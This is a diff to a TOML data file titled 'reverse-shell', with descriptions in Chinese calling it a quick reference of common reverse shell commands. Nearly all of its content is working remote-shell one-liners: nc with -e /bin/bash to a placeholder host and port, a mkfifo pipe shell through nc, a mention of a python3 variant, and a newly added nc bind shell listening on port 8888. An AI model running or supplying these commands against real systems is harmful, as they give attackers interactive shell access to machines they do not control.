@@ -1,10 +1,4 @@
-[meta]
-name = "reverse-shell"
-description = "常用反弹 shell 命令速查"
-url = ""
-
 examples = []
-
 [[hit]]
 command = "nc -e /bin/bash <host> <port>"
 description = "通过 nc 反弹 shell；需对方提前用 `nc -nvlp <port>` 监听"
@@ -16,3 +10,13 @@ description = "python3 反弹 shell"
 [[hit]]
 command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <host> <port> > /tmp/f"
 description = "通过 FIFO 管道反弹 shell"
+
+[[hit]]
+command = "nc -lp 8888 -e /bin/bash"
+description = "nc 正向监听 shell"
+
+[meta]
+name = "reverse-shell"
+description = "常用反弹 shell 命令速查"
+url = ""
+examples = []
